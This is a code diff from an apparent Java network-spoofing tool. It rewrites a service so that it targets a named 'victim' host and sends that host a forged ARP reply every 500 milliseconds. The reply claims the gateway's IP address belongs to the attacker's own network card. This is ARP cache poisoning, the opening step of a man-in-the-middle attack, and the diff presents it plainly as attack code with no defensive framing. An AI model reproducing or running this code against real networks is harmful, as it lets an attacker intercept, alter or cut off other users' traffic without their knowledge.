@@ -10,21 +10,20 @@ import org.bitducks.spoofing.core.InterfaceInfo;
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.packet.PacketFactory;
-import org.bitducks.spoofing.scan.IpRangeIterator;
-import org.bitducks.spoofing.util.IpUtil;
+import org.bitducks.spoofing.util.Constants;
 import org.bitducks.spoofing.util.gateway.GatewayFinder;
 
-public class BroadcastARPService extends Service {
+
+public class ReplyARPService extends Service {
+
 	private InterfaceInfo infoInterface;
-	private IpRangeIterator ipRange;
+	private InetAddress victim;
 	private InetAddress gateway;
 	
-	public BroadcastARPService() {
-		logger = Logger.getLogger(BroadcastARPService.class);
+	public ReplyARPService(InetAddress victim) {
+		logger = Logger.getLogger(ReplyARPService.class);
+		this.victim = victim;
 		infoInterface = Server.getInstance().getInfo();
-		InetAddress firstIp = IpUtil.network(infoInterface.getDevice());
-		InetAddress lastIp = IpUtil.lastIpInNetwork(infoInterface.getDevice());
-		ipRange = new IpRangeIterator(firstIp, lastIp);
 		try {
 			gateway = GatewayFinder.find(infoInterface.getDevice());
 		} catch (IOException e) {
@@ -35,7 +34,7 @@ public class BroadcastARPService extends Service {
 	@Override
 	public void run() {
 		while(! this.isCloseRequested()){
-			broadcastSpoof();
+			replySpoof();
 			
 			//Waiting 500ms to be sure we don't use all the CPU
 			try {
@@ -45,17 +44,11 @@ public class BroadcastARPService extends Service {
 			}
 		}
 	}
-
-	private void broadcastSpoof() {
-		ARPPacket spoofedPacket = PacketFactory.arpRequest(infoInterface.getMacAddress(), gateway, getNextIp());
-		logger.info("Broadcasting a new spoofed packet!");
+	
+	public void replySpoof() {
+		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), gateway, victim, Constants.BROADCAST);
+		logger.info("Sending a spoofed ARP reply to " + victim);
 		Server.getInstance().sendPacket(spoofedPacket);
 	}
-	
-	private InetAddress getNextIp() {
-		if(! ipRange.hasNext()) {
-			ipRange.reset();
-		}
-		return ipRange.next();
-	}
+
 }
